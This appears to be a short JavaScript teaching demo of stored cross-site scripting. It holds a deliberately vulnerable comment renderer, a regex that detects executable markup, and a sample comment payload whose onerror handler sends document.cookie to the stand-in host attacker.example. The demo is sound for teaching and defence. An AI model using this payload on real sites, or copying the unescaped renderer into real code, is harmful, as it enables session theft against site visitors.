// A comment board that builds HTML by string concatenation.
function renderComment(author, text) {
  return `<div class="comment"><b>${author}</b>: ${text}</div>`; // VULNERABLE (CWE-79)
}

// Browsers run event-handler attributes and <script> tags. This demo inspects the HTML a browser
// would receive; nothing here is executed and the URL below is never contacted.
const looksExecutable = (html) => /<script|<[a-z][^>]*\son[a-z]+\s*=/i.test(html);

const attackerComment = `<img src=x onerror="new Image().src='https://attacker.example/c?'+document.cookie">`;
const html = renderComment('mallory', attackerComment);

console.log('[demo] attacker posts a "comment". The server sends this HTML to every visitor:');
console.log('  ' + html);
if (looksExecutable(html)) {
  console.log('\n[ATTACK SUCCEEDED] the comment became live markup: the browser would run the attacker\'s script');
  console.log('                   inside every reader\'s logged-in session (cookie theft, actions as the victim).');
}
